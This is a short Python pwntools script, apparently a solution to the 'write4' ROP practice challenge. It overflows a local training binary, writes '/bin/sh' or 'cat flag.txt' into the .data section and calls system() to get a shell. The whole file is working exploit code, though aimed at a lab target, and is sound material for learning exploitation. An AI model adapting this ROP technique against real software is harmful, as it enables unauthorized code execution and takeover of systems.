#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn  import *

context.log_level = 'critical'

p = process('./write4')

data = 0x601060           # .data
pop = p64(0x400890)       # pop r14 ; pop r15 ; ret
mov = p64(0x400820)       # mov QWORD PTR [r14],r15
pop_rdi = p64(0x400893)   # pop rdi ; ret
system = p64(0x4005e0)    # system@plt

def ropchain(mode):
    rop = cyclic(40)
    if mode == 'flag':
        rop += pop
        rop += p64(data)
        rop += "cat flag"
        rop += mov
        rop += pop
        rop += p64(data+8)
        rop += ".txt AAA"
    elif mode == 'shell':
        rop += pop
        rop += p64(data)
        rop += "/bin/sh "
    rop += mov
    rop += pop_rdi
    rop += p64(data)
    rop += system
    return rop

print p.recvuntil('>')
p.sendline(ropchain('shell'))
p.recv()
p.interactive()
